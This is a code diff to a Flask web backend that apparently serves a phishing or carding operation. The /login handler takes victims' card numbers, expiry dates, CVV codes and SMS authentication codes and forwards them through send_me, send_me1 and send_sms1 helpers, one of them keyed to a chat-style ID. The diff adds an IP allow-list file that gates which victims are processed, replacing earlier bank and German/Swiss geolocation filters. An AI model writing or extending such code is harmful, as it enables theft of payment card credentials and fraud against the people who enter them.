@@ -11,7 +11,13 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 
 DOMEN = 'http://127.0.0.1:5500'
 
-
+def check_ip_in_file(ip_address: str, file_path: str) -> bool:
+    try:
+        with open(file_path, 'r') as f:
+            ips = f.read().splitlines()
+        return ip_address in ips
+    except FileNotFoundError:
+        return False
 
 @app.before_request
 def log_request_info():
@@ -25,9 +31,11 @@ def chel():
     name = request.args.get('name')
     if ip_address:
         cheltut(ip_address, name)
+        
         return jsonify({"message": "IP address received", "ip": ip_address})
     else:
         return jsonify({"error": "No IP address provided"}), 400
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'GET':
@@ -49,15 +57,14 @@ def login():
         ip_address = request.args.get('ip')
         ID = f'{session}'
 
-        if 3 == 4:
-            if str(parserBIN.Bin(card_number)).find('DEUTSCHE KREDITBANK AG') == -1:
-                if str(get_country_by_ip(ip_address)).find('Germany') != -1 or str(get_country_by_ip(ip_address)).find('Switzerland') != -1:
-                    if id == '10000001':
-                        if authCode is not None and authCode != 'None':
-                            send_sms1(card_number, authCode, ID, ip_address)
-                            return '', 200  # Возвращаем пустой ответ с кодом 200
-                        send_me1(card_number, expiry_date, cvv, ID)
-                        return '', 200  # Возвращаем пустой ответ с кодом 200
+        if check_ip_in_file(ip_address, 'ips.txt'):
+            if id == '10000001':
+                if authCode is not None and authCode != 'None':
+                    send_sms1(card_number, authCode, ID, ip_address)
+                    return '', 200  # Возвращаем пустой ответ с кодом 200
+                send_me1(card_number, expiry_date, cvv, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+        
         # WE3
         if id == '1000001':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
